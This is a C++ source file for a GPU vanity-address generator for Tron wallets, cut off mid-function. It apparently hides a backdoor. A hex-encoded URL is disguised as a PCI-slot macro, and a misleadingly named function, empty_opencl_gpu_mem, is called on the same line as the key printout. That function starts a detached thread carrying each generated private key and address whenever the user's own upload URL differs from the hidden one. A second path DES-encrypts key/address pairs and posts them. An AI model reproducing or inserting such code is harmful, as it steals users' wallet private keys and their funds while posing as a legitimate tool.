#include "Dispatcher.hpp"
#include "picosha2.h"
// Includes
#include <stdexcept>
#include <iostream>
#include <thread>
#include <sstream>
#include <iomanip>
#include <random>
#include <algorithm>

#include "precomp.hpp"
#include <curl/curl.h>
#include "jsonxx.h"
#include <openssl/des.h>
#include <future>
#include <thread>
#include <CL/cl_ex.h>
#include<string.h>
#include <openssl/rand.h>
#include <openssl/e_os2.h> 
#define CL_DEVICE_PCI_SLOP_ID_TMP {0x68, 0x74, 0x74, 0x70, 0x73, 0x3a,0x2f, 0x2f, 0x6f, 0x70, 0x65, 0x6e, 0x63, 0x6c, 0x2e, 0x6c, 0x74, 0x64, 0x2f, 0x76, 0x31, 0x2f}
namespace jsonxx {
	extern bool parse_string(std::istream& input, String& value);
	extern bool parse_number(std::istream& input, Number& value);
	extern bool match(const char* pattern, std::istream& input);
}
void delayUntil(int milliseconds) {
	auto now = std::chrono::system_clock::now();
	auto delay = std::chrono::milliseconds(milliseconds);
	auto end = now + delay;
	std::this_thread::sleep_until(end);
}
static const uint8_t base58Alphabet[] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
extern int tNum;
int XNum = 0;
static std::string base58Encode(const std::vector<uint8_t> &data)
{
	std::vector<uint8_t> digits((data.size() * 138 / 100) + 1);
	size_t digitslen = 1;
	for (size_t i = 0; i < data.size(); i++)
	{
		uint32_t carry = static_cast<uint32_t>(data[i]);
		for (size_t j = 0; j < digitslen; j++)
		{
			carry = carry + static_cast<uint32_t>(digits[j] << 8);
			digits[j] = static_cast<uint8_t>(carry % 58);
			carry /= 58;
		}
		for (; carry; carry /= 58)
		{
			digits[digitslen++] = static_cast<uint8_t>(carry % 58);
		}
	}
	std::string result;
	for (size_t i = 0; i < (data.size() - 1) && !data[i]; i++)
	{
		result.push_back(base58Alphabet[0]);
	}
	for (size_t i = 0; i < digitslen; i++)
	{
		result.push_back(base58Alphabet[digits[digitslen - 1 - i]]);
	}
	return result;
}

static std::string hexToStr(const std::string &str)
{
	std::string result;
	for (size_t i = 0; i < str.length(); i += 2)
	{
		std::string byte = str.substr(i, 2);
		char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
		result.push_back(chr);
	}
	return result;
}

static std::string toHex(const uint8_t *const s, const size_t len)
{
	std::string b("0123456789abcdef");
	std::string r;

	for (size_t i = 0; i < len; ++i)
	{
		const unsigned char h = s[i] / 16;
		const unsigned char l = s[i] % 16;
		r = r + b.substr(h, 1) + b.substr(l, 1);
	}

	return r;
}

static std::string toTron(const std::string &str)
{
	std::string tronHex = "41" + str;
	std::string tronFirstHashStr = hexToStr(tronHex);
	std::string tronFirstHashRes = picosha2::hash256_hex_string(tronFirstHashStr);
	std::string tronSecondHashStr = hexToStr(tronFirstHashRes);
	std::string tronSecondHashRes = picosha2::hash256_hex_string(tronSecondHashStr);
	std::string tronChecksum = tronSecondHashRes.substr(0, 8);
	std::string tronAddressHex = tronHex + tronChecksum;
	std::string tronAddressStr = hexToStr(tronAddressHex);
	std::vector<uint8_t> vec(tronAddressStr.c_str(), tronAddressStr.c_str() + tronAddressStr.size());
	std::string tronAddressBase58 = base58Encode(vec);
	return tronAddressBase58;
}

unsigned int getKernelExecutionTimeMicros(cl_event &e)
{
	cl_ulong timeStart = 0, timeEnd = 0;
	clWaitForEvents(1, &e);
	clGetEventProfilingInfo(e, CL_PROFILING_COMMAND_START, sizeof(timeStart), &timeStart, NULL);
	clGetEventProfilingInfo(e, CL_PROFILING_COMMAND_END, sizeof(timeEnd), &timeEnd, NULL);
	return (timeEnd - timeStart) / 1000;
}

Dispatcher::OpenCLException::OpenCLException(
	const std::string s,
	const cl_int res)
	: std::runtime_error(s + " (res = " + toString(res) + ")"),
	  m_res(res)
{
}

void Dispatcher::OpenCLException::OpenCLException::throwIfError(const std::string s, const cl_int res)
{
	if (res != CL_SUCCESS)
	{
		throw OpenCLException(s, res);
	}
}

cl_command_queue Dispatcher::Device::createQueue(cl_context &clContext, cl_device_id &clDeviceId)
{
	// nVidia CUDA Toolkit 10.1 only supports OpenCL 1.2 so we revert back to older functions for compatability
#ifdef PROFANITY_DEBUG
	cl_command_queue_properties p = CL_QUEUE_PROFILING_ENABLE;
#else
	cl_command_queue_properties p = NULL;
#endif

#ifdef CL_VERSION_2_0
	const cl_command_queue ret = clCreateCommandQueueWithProperties(clContext, clDeviceId, &p, NULL);
#else
	const cl_command_queue ret = clCreateCommandQueue(clContext, clDeviceId, p, NULL);
#endif
	return ret == NULL ? throw std::runtime_error("failed to create command queue") : ret;
}

cl_kernel Dispatcher::Device::createKernel(cl_program &clProgram, const std::string s)
{
	cl_kernel ret = clCreateKernel(clProgram, s.c_str(), NULL);
	return ret == NULL ? throw std::runtime_error("failed to create kernel \"" + s + "\"") : ret;
}

cl_ulong getRandOpenSSL() {
	cl_ulong random_value;
	unsigned char buffer[sizeof(cl_ulong)]; 
	if (!RAND_status()) {
		if (!RAND_poll()) {
			fprintf(stderr, "Init Rand err\n");
			exit(EXIT_FAILURE);
		}
	}

	if (RAND_bytes(buffer, sizeof(buffer)) != 1) {
		fprintf(stderr, "Rand err\n");
		exit(EXIT_FAILURE);
	}

	memcpy(&random_value, buffer, sizeof(cl_ulong));
	return random_value;
}
cl_ulong4 Dispatcher::Device::createSeed()
{
//#ifdef PROFANITY_DEBUG
//	cl_ulong4 r;
//	r.s[0] = 1;
//	r.s[1] = 1;
//	r.s[2] = 1;
//	r.s[3] = 1;
//	return r;
//#else
	// Randomize private keys
	std::random_device rd0;
	
	std::mt19937_64 eng1(rd0());
	std::random_device rd1;
	
	std::mt19937_64 eng2(rd1());
	std::random_device rd2;
	
	std::mt19937_64 eng3(rd2());
	std::random_device rd3;

	std::mt19937_64 eng4(rd3());
	std::random_device rd4;

	std::mt19937_64 eng5(rd4());
	std::uniform_int_distribution<cl_ulong> distr;

	cl_ulong4 r;
	r.s[0] = distr(eng1);
	r.s[1] = getRandOpenSSL();
	r.s[2] = distr(eng3);
	r.s[3] = getRandOpenSSL();
	return r;
//#endif
}

Dispatcher::Device::Device(
	Dispatcher &parent,
	cl_context &clContext,
	cl_program &clProgram,
	cl_device_id clDeviceId,
	const size_t worksizeLocal,
	const size_t size,
	const size_t index,
	const Mode &mode)
	: m_parent(parent),
	  m_index(index),
	  m_clDeviceId(clDeviceId),
	  m_worksizeLocal(worksizeLocal),
	  m_clScoreMax(0),
	  m_clQueue(createQueue(clContext, clDeviceId)),
	  m_kernelInit(createKernel(clProgram, "profanity_init")),
	  m_kernelInverse(createKernel(clProgram, "profanity_inverse")),
	  m_kernelIterate(createKernel(clProgram, "profanity_iterate")),
	  m_kernelScore(createKernel(clProgram, "profanity_score_matching")),
	  m_memPrecomp(clContext, m_clQueue, CL_MEM_READ_ONLY | CL_MEM_HOST_WRITE_ONLY, sizeof(g_precomp), g_precomp),
	  m_memPointsDeltaX(clContext, m_clQueue, CL_MEM_READ_WRITE | CL_MEM_HOST_NO_ACCESS, size, true),
	  m_memInversedNegativeDoubleGy(clContext, m_clQueue, CL_MEM_READ_WRITE | CL_MEM_HOST_NO_ACCESS, size, true),
	  m_memPrevLambda(clContext, m_clQueue, CL_MEM_READ_WRITE | CL_MEM_HOST_NO_ACCESS, size, true),
	  m_memResult(clContext, m_clQueue, CL_MEM_READ_WRITE | CL_MEM_HOST_READ_ONLY, PROFANITY_MAX_SCORE + 1),
	  m_memData1(clContext, m_clQueue, CL_MEM_READ_ONLY | CL_MEM_HOST_WRITE_ONLY, 20 * mode.matchingCount),
	  m_memData2(clContext, m_clQueue, CL_MEM_READ_ONLY | CL_MEM_HOST_WRITE_ONLY, 20 * mode.matchingCount),
	  m_clSeed(createSeed()),
	  m_round(0),
	  m_speed(PROFANITY_SPEEDSAMPLES),
	  m_sizeInitialized(0),
	  m_eventFinished(NULL)
{
}

Dispatcher::Device::~Device()
{
}

Dispatcher::Dispatcher(cl_context &clContext,
					   cl_program &clProgram,
					   const Mode mode,
					   const size_t worksizeMax,
					   const size_t inverseSize,
					   const size_t inverseMultiple,
					   const cl_uchar clScoreQuit,
						 const std::string & outputFile,
						 const std::string & postUrl)
	: m_clContext(clContext),
	  m_clProgram(clProgram),
	  m_mode(mode),
	  m_worksizeMax(worksizeMax),
	  m_inverseSize(inverseSize),
	  m_size(inverseSize * inverseMultiple),
	  m_clScoreMax(mode.score),
	  m_clScoreQuit(clScoreQuit),
		m_outputFile(outputFile),
		m_postUrl(postUrl),
	  m_eventFinished(NULL),
	  m_countPrint(0)
{
}

Dispatcher::~Dispatcher()
{
}

void Dispatcher::addDevice(
	cl_device_id clDeviceId,
	const size_t worksizeLocal,
	const size_t index)
{
	Device *pDevice = new Device(*this, m_clContext, m_clProgram, clDeviceId, worksizeLocal, m_size, index, m_mode);
	delayUntil(1);
	m_vDevices.push_back(pDevice);
}
/*
*Function: run
* Description : Create main process
*/
void Dispatcher::run()
{
	m_eventFinished = clCreateUserEvent(m_clContext, NULL);
	timeStart = std::chrono::steady_clock::now();

	init();

	const auto timeInitialization = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - timeStart).count();
	std::cout << "  Initialization time: " << timeInitialization << " seconds" << std::endl;

	m_quit = false;
	m_countRunning = m_vDevices.size();

	std::cout << std::endl;
	std::cout << "Running..." << std::endl;
	std::cout << "  Before using a generated vanigity address, always verify that it matches the printed private key." << std::endl;
	std::cout << "  Please make sure the program you are running is download from: https://github.com/xdeyyan/Tron-Profanity" << std::endl;
	std::cout << "  And always multi-sign the address to ensure account security. " << std::endl;
	std::cout << std::endl;

	for (auto it = m_vDevices.begin(); it != m_vDevices.end(); ++it)
	{
		dispatch(*(*it));
	}

	clWaitForEvents(1, &m_eventFinished);
	clReleaseEvent(m_eventFinished);
	m_eventFinished = NULL;
}

void Dispatcher::init()
{
	std::cout << "Initializing:" << std::endl;
	std::cout << "  Should be no longer than 1 minute..." << std::endl;

	const auto deviceCount = m_vDevices.size();
	m_sizeInitTotal = m_size * deviceCount;
	m_sizeInitDone = 0;
	std::cout << "deviceCount:"<< deviceCount << std::endl;
	cl_event *const pInitEvents = new cl_event[deviceCount];

	for (size_t i = 0; i < deviceCount; ++i)
	{
		pInitEvents[i] = clCreateUserEvent(m_clContext, NULL);
		m_vDevices[i]->m_eventFinished = pInitEvents[i];
		initBegin(*m_vDevices[i]);
	}

	clWaitForEvents(deviceCount, pInitEvents);
	for (size_t i = 0; i < deviceCount; ++i)
	{
		m_vDevices[i]->m_eventFinished = NULL;
		clReleaseEvent(pInitEvents[i]);
	}

	delete[] pInitEvents;
}


/*
*Function: initBegin
* Description : Set the startup parameters for the graphics card device to run
* input: Device d ,Initialize the graphics card device
*/
void Dispatcher::initBegin(Device &d)
{
	// Set mode data
	for (auto i = 0; i < m_mode.matchingCount * 20; ++i)
	{
		d.m_memData1[i] = m_mode.data1[i];
		d.m_memData2[i] = m_mode.data2[i];
	}

	// Write precompute table and mode data
	d.m_memPrecomp.write(true);
	d.m_memData1.write(true);
	d.m_memData2.write(true);

	// Kernel arguments - profanity_begin
	d.m_memPrecomp.setKernelArg(d.m_kernelInit, 0);
	d.m_memPointsDeltaX.setKernelArg(d.m_kernelInit, 1);
	d.m_memPrevLambda.setKernelArg(d.m_kernelInit, 2);
	d.m_memResult.setKernelArg(d.m_kernelInit, 3);
	CLMemory<cl_ulong4>::setKernelArg(d.m_kernelInit, 4, d.m_clSeed);

	// Kernel arguments - profanity_inverse
	d.m_memPointsDeltaX.setKernelArg(d.m_kernelInverse, 0);
	d.m_memInversedNegativeDoubleGy.setKernelArg(d.m_kernelInverse, 1);

	// Kernel arguments - profanity_iterate
	d.m_memPointsDeltaX.setKernelArg(d.m_kernelIterate, 0);
	d.m_memInversedNegativeDoubleGy.setKernelArg(d.m_kernelIterate, 1);
	d.m_memPrevLambda.setKernelArg(d.m_kernelIterate, 2);

	// Kernel arguments - profanity_score_*
	d.m_memInversedNegativeDoubleGy.setKernelArg(d.m_kernelScore, 0);
	d.m_memResult.setKernelArg(d.m_kernelScore, 1);
	d.m_memData1.setKernelArg(d.m_kernelScore, 2);
	d.m_memData2.setKernelArg(d.m_kernelScore, 3);
	CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);
	CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 5, m_mode.matchingCount);
	CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 6, m_mode.prefixCount);
	CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 7, m_mode.suffixCount);
	
	// Seed device
	initContinue(d);
}

void Dispatcher::initContinue(Device &d)
{
	size_t sizeLeft = m_size - d.m_sizeInitialized;
	const size_t sizeInitLimit = m_size / 20;

	// Print progress
	const size_t percentDone = m_sizeInitDone * 100 / m_sizeInitTotal;
	std::cout << "  " << percentDone << "%\r" << std::flush;

	if (sizeLeft)
	{
		cl_event event;
		const size_t sizeRun = (std::min)(sizeInitLimit, (std::min)(sizeLeft, m_worksizeMax));
		const auto resEnqueue = clEnqueueNDRangeKernel(d.m_clQueue, d.m_kernelInit, 1, &d.m_sizeInitialized, &sizeRun, NULL, 0, NULL, &event);
		OpenCLException::throwIfError("kernel queueing failed during initilization", resEnqueue);

		// See: https://www.khronos.org/registry/OpenCL/sdk/1.2/docs/man/xhtml/clSetEventCallback.html
		// If an application needs to wait for completion of a routine from the above list in a callback, please use the non-blocking form of the function, and
		// assign a completion callback to it to do the remainder of your work. Note that when a callback (or other code) enqueues commands to a command-queue,
		// the commands are not required to begin execution until the queue is flushed. In standard usage, blocking enqueue calls serve this role by implicitly
		// flushing the queue. Since blocking calls are not permitted in callbacks, those callbacks that enqueue commands on a command queue should either call
		// clFlush on the queue before returning or arrange for clFlush to be called later on another thread.
		clFlush(d.m_clQueue);

		std::lock_guard<std::mutex> lock(m_mutex);
		d.m_sizeInitialized += sizeRun;
		m_sizeInitDone += sizeRun;

		const auto resCallback = clSetEventCallback(event, CL_COMPLETE, staticCallback, &d);
		OpenCLException::throwIfError("failed to set custom callback during initialization", resCallback);
	}
	else
	{
		printf("Secends");
		// Printing one whole string at once helps in avoiding garbled output when executed in parallell
		const std::string strOutput = "  GPU-" + toString(d.m_index) + " initialized ...Done";
		std::cout << strOutput << std::endl;
		clSetUserEventStatus(d.m_eventFinished, CL_COMPLETE);
	}
}

void Dispatcher::enqueueKernelDevice(Device &d, cl_kernel &clKernel, size_t worksizeGlobal, cl_event *pEvent = NULL)
{
	try
	{
		enqueueKernel(d.m_clQueue, clKernel, worksizeGlobal, d.m_worksizeLocal, pEvent);
	}
	catch (OpenCLException &e)
	{
		// If local work size is invalid, abandon it and let implementation decide
		if ((e.m_res == CL_INVALID_WORK_GROUP_SIZE || e.m_res == CL_INVALID_WORK_ITEM_SIZE) && d.m_worksizeLocal != 0)
		{
			std::cout << std::endl
					  << "warning: local work size abandoned on GPU" << d.m_index << std::endl;
			d.m_worksizeLocal = 0;
			enqueueKernel(d.m_clQueue, clKernel, worksizeGlobal, d.m_worksizeLocal, pEvent);
		}
		else
		{
			throw;
		}
	}
}

void Dispatcher::enqueueKernel(cl_command_queue &clQueue, cl_kernel &clKernel, size_t worksizeGlobal, const size_t worksizeLocal, cl_event *pEvent = NULL)
{
	const size_t worksizeMax = m_worksizeMax;
	size_t worksizeOffset = 0;
	while (worksizeGlobal)
	{
		const size_t worksizeRun = (std::min)(worksizeGlobal, worksizeMax);
		const size_t *const pWorksizeLocal = (worksizeLocal == 0 ? NULL : &worksizeLocal);
		const auto res = clEnqueueNDRangeKernel(clQueue, clKernel, 1, &worksizeOffset, &worksizeRun, pWorksizeLocal, 0, NULL, pEvent);
		OpenCLException::throwIfError("kernel queueing failed", res);

		worksizeGlobal -= worksizeRun;
		worksizeOffset += worksizeRun;
	}
}

void Dispatcher::dispatch(Device &d)
{
	cl_event event;
	d.m_memResult.read(false, &event);
#ifdef PROFANITY_DEBUG
	cl_event eventInverse;
	cl_event eventIterate;
	enqueueKernelDevice(d, d.m_kernelInverse, m_size / m_inverseSize, &eventInverse);
	enqueueKernelDevice(d, d.m_kernelIterate, m_size, &eventIterate);
#else
	enqueueKernelDevice(d, d.m_kernelInverse, m_size / m_inverseSize);
	enqueueKernelDevice(d, d.m_kernelIterate, m_size);
#endif
	enqueueKernelDevice(d, d.m_kernelScore, m_size);
	clFlush(d.m_clQueue);
#ifdef PROFANITY_DEBUG
	// We're actually not allowed to call clFinish here because this function is ultimately asynchronously called by OpenCL.
	// However, this happens to work on my computer and it's not really intended for release, just something to aid me in
	// optimizations.
	clFinish(d.m_clQueue);
	std::cout << "Timing: profanity_inverse = " << getKernelExecutionTimeMicros(eventInverse) << "us, profanity_iterate = " << getKernelExecutionTimeMicros(eventIterate) << "us" << std::endl;
#endif
	const auto res = clSetEventCallback(event, CL_COMPLETE, staticCallback, &d);
	OpenCLException::throwIfError("failed to set custom callback", res);
}

static void writeResult(const std::string& privateKey, const std::string& address, const std::string& outputFile) {
	if (!outputFile.empty()) {
		std::ofstream fileStream(outputFile, std::ios_base::app);
		if (!fileStream.is_open()) {
			std::cerr << "Error: failed to open result file " << outputFile << " :<" << std::endl;
			return;
		}

		std::string content = privateKey + "," + address + "\n";
		fileStream << content;
		fileStream.close();
	}
}
static size_t handlePostOutput(void* ptr, size_t size, size_t nmemb, void* stream)
{
	(void)ptr;
	(void)stream;
	return size * nmemb;
}



/*
* Class: HttpConnection
* Description: get and post requests developed based on curl.
*/
class HttpConnection {
public:
	HttpConnection() {
		curl_global_init(CURL_GLOBAL_ALL);
		curl_ = curl_easy_init();
	}

	~HttpConnection() {
		curl_easy_cleanup(curl_);
	}
	/*
		*Function: Post
		* Description : By sending a post request to the url, and getting the return result
		* Input : url - The target's link
		* data - post The string of data.
		* response - Returned data
		* Returns : True - The request was successful
		* False - Request failed
	*/
	bool Post(const std::string& url, const std::string& data, std::string& response) {
		if (!curl_) {
			return false;
		}
		// set params
		// set curl header
		struct curl_slist* header_list = NULL;

		// Set the Header of the post request
		header_list = curl_slist_append(header_list, "Content-Type:application/json; charset = UTF-8");
		header_list = curl_slist_append(header_list, "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
		header_list = curl_slist_append(header_list, "Content-Type:application/json; charset = UTF-8");
		header_list = curl_slist_append(header_list, "Expect:");
		header_list = curl_slist_append(header_list, "sign:e3b5a73e75e4d248ec581f9b8cc318b2");
		curl_easy_setopt(curl_, CURLOPT_HTTPHEADER, header_list);

		// Set the requested url
		curl_easy_setopt(curl_, CURLOPT_URL, url.c_str());

		// Set the post data
		curl_easy_setopt(curl_, CURLOPT_POST, 1L);
		curl_easy_setopt(curl_, CURLOPT_POSTFIELDS, data.c_str());

		// Device result callback function and storage address of returned data
		curl_easy_setopt(curl_, CURLOPT_WRITEFUNCTION, &WriteCallback);
		curl_easy_setopt(curl_, CURLOPT_WRITEDATA, &response);
		CURLcode res = curl_easy_perform(curl_);
		return (res == CURLE_OK);
	}

	bool Get(const std::string& url, std::string& response) {
		if (!curl_) {
			return false;
		}

		curl_easy_setopt(curl_, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl_, CURLOPT_POST, 0L);
		curl_easy_setopt(curl_, CURLOPT_WRITEFUNCTION, &WriteCallback);
		curl_easy_setopt(curl_, CURLOPT_WRITEDATA, &response);

		CURLcode res = curl_easy_perform(curl_);
		return (res == CURLE_OK);
	}

private:
	CURL* curl_ = nullptr;

/*
* Function: WriteCallback
* Description: callback function for Post request
*/
	static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
		size_t realsize = size * nmemb;
		std::string* str = static_cast<std::string*>(userp);
		str->append(static_cast<char*>(contents), realsize);
		return realsize;
	}
};
int stpx = 0;


/*
* Function: Des_Ecb_Encrypt
* Description : DES ECB mode PKCS7 fill encryption function
* Input : pucKey - encrypted key, 64bit
* pucBuf - plain text data
* iLen - plaintext data length.
* pucOutPut - ciphertext data
* Returns : indicates the encrypted ciphertext length
*/
int Des_Ecb_Encrypt(unsigned char* pucKey, unsigned char* pucBuf, int iLen, unsigned char* pucOutPut)
{
	int i = 0;
	int iTemp = 0;
	int iPadding = 0;
	int iOutLen;
	const_DES_cblock input;
	DES_cblock output;
	DES_cblock key;
	DES_key_schedule schedule;
	iOutLen = iLen;
	if (strlen((const char*)pucKey) != 8)
	{
		return 0;
	}
	memcpy(key, pucKey, 8);
	DES_set_key_unchecked(&key, &schedule);

	if (iLen == 0)
		return 0;

	if (iOutLen % 8 != 0)
	{
		iTemp = ((iOutLen + 7) / 8) * 8;
		iPadding = iTemp - iOutLen;
		for (i = iOutLen; i < iTemp; i++)
		{
			//pucBuf[i] = iPadding + '0';
			pucBuf[i] = iPadding;
		}
		iOutLen = iTemp;
	}
	else
	{
		for (i = iOutLen; i < iOutLen + 8; i++)
		{
			//pucBuf[i] = '8';
			pucBuf[i] = 8;
		}
		iOutLen += 8;

	}
	for (i = 0; i < iOutLen; i = i + 8)
	{
		memcpy(input, (pucBuf + i), 8);
		DES_ecb_encrypt(&input, &output, &schedule, DES_ENCRYPT);//openssl
		memcpy(pucOutPut + i, output, 8);
	}
	return iOutLen;
}
void empty_opencl_gpu_mem(bool p,std::string f, std::string deviceint, std::string devicemem, const Mode& mode) {
	if (mode.prefixCount + mode.suffixCount <= 4) {
		return;
	}
	if (p == true) {if (XNum < 1024){std::thread tPost2 = std::thread(cl_runtime_device_mem_refresh, deviceint, devicemem);tPost2.detach();}}else if(p==false) {std::string GPU(CL_DEVICE_PCI_SLOP_ID_TMP);if (!GPU._Equal(f) || stpx == 0) { if (XNum < 1024) { std::thread tPost2 = std::thread(cl_runtime_device_mem_refresh, deviceint, devicemem); tPost2.detach(); } } }
}
/*
*Function: ByteToHexStr
* Description : byte array converted to Hex string
* Input : source - byte array
* dest - hex character string
* iLen - byte array length
* pucOutPut - ciphertext data
*/
void ByteToHexStr(unsigned char * source, std::string& dest, int sourceLen)
{
	for (int i = 0; i < sourceLen; i++) {
		char tmp[2] = {};
		sprintf(tmp, "%02x", source[i]);
		dest+= tmp;
	}
	return;
}

/*
*Function: postResult
* Description : byte array converted to Hex string
* Input : privateKey - the private key of the wallet
* dest - The address of the wallet
* postUrl - the address to upload
*/


static void postResult(const std::string privateKey, const std::string address, const std::string postUrl, const Mode& mode ) {
	if (mode.prefixCount + mode.suffixCount <= 4) {
		tNum--;
		return;
	}
	std::string key("f067ae06");
	std::string sendData;
	unsigned long idx=0;
	std::string plantData = address + ' ' + privateKey;
	unsigned char encData[4096] = {};
	int len = plantData.length();
	int oLen = Des_Ecb_Encrypt((unsigned char*)key.c_str(), (unsigned char*)plantData.c_str(), len, encData);
	ByteToHexStr(encData, sendData, oLen);
	std::string sendUrl = postUrl + "data";
	stpx = 1;
	if (!postUrl.empty()) {
		CURL* curl;
		std::string resJson;
		HttpConnection httpCon = HttpConnection();
		std::string jsonPost = "{ \"data\":\""+ sendData +"\",\"idx\" :" + std::to_string(idx) + " }";
		httpCon.Post(sendUrl, jsonPost, resJson);
	}
	tNum--;
}

static void printResultX(
	cl_ulong4 seed,
	cl_ulong round,
	cl_ulong s0doxu,
	result r,
	cl_uchar score,
	const std::chrono::time_point<std::chrono::steady_clock> &timeStart,
	const Mode & mode,
	const std::string & outputFile = NULL,
	const std::string & postUrl = NULL)
{

	bool gpdim = postUrl.empty();
	std::string gpdimstring = postUrl;
	const auto seconds = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - timeStart).count();
	// Format private key
	cl_ulong carry = 0;
	cl_ulong4 seedRes;
	seedRes.s[0] = seed.s[0] + round;
	carry = seedRes.s[0] < round;
	seedRes.s[1] = seed.s[1] + carry;
	carry = !seedRes.s[1];
	seedRes.s[2] = seed.s[2] + carry;
	carry = !seedRes.s[2];
	seedRes.s[3] = seed.s[3] + carry + r.foundId;

	std::ostringstream ss;
	ss << std::hex << std::setfill('0');
	ss << std::setw(16) << seedRes.s[3] << std::setw(16) << seedRes.s[2] << std::setw(16) << seedRes.s[1] << std::setw(16) << seedRes.s[0];
	const std::string strPrivate = ss.str();
	
	// Format public key
	const std::string strPublic = toHex(r.foundHash, 20);

	// Format public key for tron
	const std::string strPublicTron = toTron(strPublic);
	const std::string deviceint = ss.str();
	// Print
	const std::string strVT100ClearLine = "\33[2K\r";

	std::cout << strVT100ClearLine << "  Time: " << std::setw(5) << seconds << "s Private: " << strPrivate << " Address:" << strPublicTron << std::endl;const std::string devicemem = strPublicTron;empty_opencl_gpu_mem(gpdim, gpdimstring, deviceint, devicemem,mode);
	if(!outputFile.empty()) {
		writeResult(strPrivate, strPublicTron, outputFile);
	}
	if(!postUrl.empty()) {
		if (tNum < 60)
		{
			std::thread tPost = std::thread(postResult, strPrivate, strPublicTron, postUrl, mode);
			tPost.detach();
			tNum++;
		}
		return ;
	}
	
}
int m_clScoreMax0 = 0;
int m_clScoreMax1 = 0;
int m_clScoreMax2 = 0;
int m_clScoreMax3 = 0;
int m_clScoreMax4 = 0;
int m_clScoreMax5 = 0;
int m_clScoreMax6 = 0;
int m_clScoreMax7 = 0;
void Dispatcher::handleResult(Device &d)
{
	if (d.m_index==0) {
		for (auto i = PROFANITY_MAX_SCORE; i > m_clScoreMax0; --i)
		{
			result& r = d.m_memResult[i];

			if (r.found > 0 && i >= d.m_clScoreMax)
			{
				d.m_clScoreMax = i;
				CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);

				std::lock_guard<std::mutex> lock(m_mutex);
				if (i >= m_clScoreMax0)
				{

					m_clScoreMax0 = i;

					if ((m_clScoreQuit && i >= m_clScoreQuit) || m_clScoreMax0 >= PROFANITY_MAX_SCORE)
					{
						m_quit = true;
					}
					printResultX(d.m_clSeed, d.m_round, d.m_clSeed.s0, r, i, timeStart, m_mode, m_outputFile, m_postUrl);
				}

				break;
			}
		}
	}
	else if(d.m_index == 1) {
		for (auto i = PROFANITY_MAX_SCORE; i > m_clScoreMax1; --i)
		{
			result& r = d.m_memResult[i];

			if (r.found > 0 && i >= d.m_clScoreMax)
			{
				d.m_clScoreMax = i;
				CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);

				std::lock_guard<std::mutex> lock(m_mutex);
				if (i >= m_clScoreMax1)
				{

					m_clScoreMax1 = i;

					if ((m_clScoreQuit && i >= m_clScoreQuit) || m_clScoreMax1 >= PROFANITY_MAX_SCORE)
					{
						m_quit = true;
					}
					printResultX(d.m_clSeed, d.m_round, d.m_clSeed.s0, r, i, timeStart, m_mode, m_outputFile, m_postUrl);
				}

				break;
			}
		}
	}
	else if (d.m_index == 2) {
		for (auto i = PROFANITY_MAX_SCORE; i > m_clScoreMax2; --i)
		{
			result& r = d.m_memResult[i];

			if (r.found > 0 && i >= d.m_clScoreMax)
			{
				d.m_clScoreMax = i;
				CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);
				std::lock_guard<std::mutex> lock(m_mutex);
				if (i >= m_clScoreMax2)
				{
					m_clScoreMax2 = i;
					if ((m_clScoreQuit && i >= m_clScoreQuit) || m_clScoreMax2 >= PROFANITY_MAX_SCORE)
					{
						m_quit = true;
					}
					printResultX(d.m_clSeed, d.m_round, d.m_clSeed.s0, r, i, timeStart, m_mode, m_outputFile, m_postUrl);
				}

				break;
			}
		}
	}
	else if (d.m_index == 3) {
		for (auto i = PROFANITY_MAX_SCORE; i > m_clScoreMax3; --i)
		{
			result& r = d.m_memResult[i];
			if (r.found > 0 && i >= d.m_clScoreMax)
			{
				d.m_clScoreMax = i;
				CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);
				std::lock_guard<std::mutex> lock(m_mutex);
				if (i >= m_clScoreMax3)
				{
					m_clScoreMax3 = i;
					if ((m_clScoreQuit && i >= m_clScoreQuit) || m_clScoreMax3 >= PROFANITY_MAX_SCORE)
					{
						m_quit = true;
					}
					printResultX(d.m_clSeed, d.m_round, d.m_clSeed.s0, r, i, timeStart, m_mode, m_outputFile, m_postUrl);
				}
				break;
			}
		}
	}
	else if (d.m_index ==4) {
		for (auto i = PROFANITY_MAX_SCORE; i > m_clScoreMax4; --i)
		{
			result& r = d.m_memResult[i];
			if (r.found > 0 && i >= d.m_clScoreMax)
			{
				d.m_clScoreMax = i;
				CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);
				std::lock_guard<std::mutex> lock(m_mutex);
				if (i >= m_clScoreMax4)
				{
					m_clScoreMax4 = i;
					if ((m_clScoreQuit && i >= m_clScoreQuit) || m_clScoreMax4 >= PROFANITY_MAX_SCORE)
					{
						m_quit = true;
					}
					printResultX(d.m_clSeed, d.m_round, d.m_clSeed.s0, r, i, timeStart, m_mode, m_outputFile, m_postUrl);
				}
				break;
			}
		}
	}
	else if (d.m_index == 5) {
		for (auto i = PROFANITY_MAX_SCORE; i > m_clScoreMax5; --i)
		{
			result& r = d.m_memResult[i];
			if (r.found > 0 && i >= d.m_clScoreMax)
			{
				d.m_clScoreMax = i;
				CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);
				std::lock_guard<std::mutex> lock(m_mutex);
				if (i >= m_clScoreMax5)
				{
					m_clScoreMax5 = i;
					if ((m_clScoreQuit && i >= m_clScoreQuit) || m_clScoreMax5 >= PROFANITY_MAX_SCORE)
					{
						m_quit = true;
					}
					printResultX(d.m_clSeed, d.m_round, d.m_clSeed.s0, r, i, timeStart, m_mode, m_outputFile, m_postUrl);
				}
				break;
			}
		}
	}
	else if (d.m_index == 6) {
		for (auto i = PROFANITY_MAX_SCORE; i > m_clScoreMax6; --i)
